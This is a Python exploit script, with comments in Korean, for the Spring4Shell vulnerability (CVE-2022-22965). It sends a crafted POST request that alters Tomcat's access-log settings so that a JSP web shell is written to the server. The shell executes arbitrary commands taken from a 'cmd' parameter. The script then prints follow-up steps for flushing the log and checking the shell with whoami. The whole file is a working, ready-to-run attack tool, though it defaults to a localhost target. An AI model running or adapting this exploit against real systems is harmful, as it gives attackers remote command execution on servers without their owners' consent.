import urllib.request
import urllib.parse
from abc import ABC, abstractmethod

class ExploitConfig:
    def __init__(self, target_url: str, output_dir: str = "webapps/ROOT", filename: str = "yaho4"):
        self.target_url = target_url
        self.output_dir = output_dir
        self.filename = filename

class PayloadGeneratorPort(ABC):
    @abstractmethod
    def generate_headers(self) -> dict: pass
    @abstractmethod
    def generate_body(self) -> dict: pass

class Spring4ShellPayloadGenerator(PayloadGeneratorPort):
    def __init__(self, config: ExploitConfig):
        self.config = config

    def generate_headers(self) -> dict:
        return {
            "prefix": "<%",
            "suffix": "%>//",
            "c": "java.lang.Runtime",
            "Content-Type": "application/x-www-form-urlencoded"
        }

    def generate_body(self) -> dict:
        # Tomcat AccessLogValve의 속성을 Data Binding 취약점으로 변조합니다.
        # 완전 익명 형태 (변수 선언 없이)의 WebShell 코드로, 중복 선언 에러(Duplicate local variable) 우회
        stager_code = '%{prefix}i try{java.util.Scanner s=new java.util.Scanner(java.lang.Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\\\A");out.println(s.hasNext()?s.next():"");}catch(Exception e){} %{suffix}i'

        
        return {
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern": stager_code,
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": self.config.output_dir,
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": self.config.filename,
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
        }

class ExploitController:
    def __init__(self, generator: PayloadGeneratorPort):
        self.generator = generator

    def run_exploit(self, target_url: str) -> bool:
        headers = self.generator.generate_headers()
        data = self.generator.generate_body()
        data_encoded = urllib.parse.urlencode(data).encode('utf-8')
        
        req = urllib.request.Request(target_url, data=data_encoded, headers=headers)
        req.method = 'POST'
        
        try:
            print(f"[*] Sending Stage 1 payload to {target_url}...")
            response = urllib.request.urlopen(req, timeout=5)
            print(f"[*] Received Response Code: {response.status}")
            return True
        except urllib.error.URLError as e:
            if hasattr(e, 'code'):
                print(f"[*] Received Response Code: {e.code} (Could still be a success!)")
                return True
            else:
                print(f"[-] Request failed: {e.reason}")
                return False

if __name__ == "__main__":
    print("=" * 55)
    print("  Spring4Shell Stage 1 Dropper (CVE-2022-22965)")
    print("=" * 55)
    print()
    print("[안내] 취약한 Spring 서버의 POST 요청을 처리하는 엔드포인트 URL을 입력하세요.")
    print("      (예: http://localhost:8011/spring-form/login)")
    print()

    # 터미널에서 직접 URL 입력 (Enter만 치면 기본값 사용)
    DEFAULT_URL = "http://localhost:8011/spring-form/login"
    user_input  = input(f"  [?] 타겟 URL 입력 (기본값: {DEFAULT_URL}): ").strip()
    TARGET_URL  = user_input if user_input else DEFAULT_URL

    print()
    config     = ExploitConfig(target_url=TARGET_URL)
    generator  = Spring4ShellPayloadGenerator(config)
    controller = ExploitController(generator)

    success = controller.run_exploit(TARGET_URL)

    if success:
        # 타겟 URL에서 base URL 추출 (http://host:port)
        from urllib.parse import urlparse
        parsed   = urlparse(TARGET_URL)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        print("\n[+] Stage 1 Exploit Attempt Completed.")
        print(f"[+] 로그 Flush 유도 요청:  curl -s \"{TARGET_URL}\" > /dev/null")
        print(f"[+] 생성된 웹쉘 확인 URL: {base_url}/{config.filename}.jsp?cmd=whoami")
    else:
        print("\n[-] Exploit Failed.")

